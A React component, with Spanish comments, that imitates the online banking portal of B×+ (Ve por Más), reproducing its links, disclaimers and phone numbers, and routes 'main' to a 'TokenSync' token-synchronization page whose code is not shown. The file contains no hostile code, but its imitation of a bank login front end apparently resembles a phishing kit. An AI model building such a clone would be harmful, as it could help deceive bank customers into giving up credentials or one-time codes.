import React from 'react'
import { useParams } from 'react-router-dom'
import TokenSync from './TokenSync'

const Container: React.FC = () => {
  const { route } = useParams<{ route: string }>()
  
  // Si la ruta es "main", mostrar la página de sincronización de token
  if (route === 'main') {
    return <TokenSync />
  }
  
  // Para otras rutas, mostrar contenido por defecto
  return (
    <div className="wrapper dark">
      <div className="container">
        <header>
          <ul className="links pull-right">
            <li>
              <a href="https://www.vepormas.com/fwpf/portal/documents/sucursales" target="_blank" rel="noopener noreferrer">Sucursales</a>
            </li>
            <li>
              <a href="https://www.vepormas.com/fwpf/portal/documents/llamenme-ahora" target="_blank" rel="noopener noreferrer">Contacto</a>
            </li>
            <li>
              <a href="https://www.vepormas.com/fwpf/portal/documents/manuales-banca-en-linea" target="_blank" rel="noopener noreferrer">Ayuda</a>
            </li>
          </ul>
          <div className="clearfix"></div>
        </header>

        <div className="row content">
          <div className="col-sm-12">
            <div className="panel panel-default">
              <div className="panel-body">
                <h2>Bienvenido a Banca en Línea B×+</h2>
                <p>Ruta actual: {route || 'main'}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="row">
          <div className="col-md-offset-1 col-sm-offset-1 col-lg-offset-1">
            <footer className="bck-darkgray">
              <div className="small text-center">
                <ul className="links foot">
                  <li>
                    <a href="https://www.vepormas.com/recursos/resources/img/03MAY_GUIA_INVERSION.PDF" target="_blank" rel="noopener noreferrer">Guía de servicios de inversión</a>
                  </li>
                  <li>
                    <a href="https://www.vepormas.com/fwpf/portal/documents/tips-de-seguridad" target="_blank" rel="noopener noreferrer">Tips de seguridad</a>
                  </li>
                  <li>
                    <a href="https://www.vepormas.com/recursos/res/html/terminos_condiciones.pdf" target="_blank" rel="noopener noreferrer">Términos y condiciones</a>
                  </li>
                  <li>
                    <a href="https://www.vepormas.com/fwpf/portal/documents/aviso-legal" target="_blank" rel="noopener noreferrer">Aviso legal</a>
                  </li>
                </ul>
                <span className="linea-bxm">
                  Línea B×+ Cd. de México y área metropolitana 55 1102 1919, del interior sin costo 800 837 6762.
                </span>
                <div className="clearfix"></div>
              </div>
            </footer>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Container

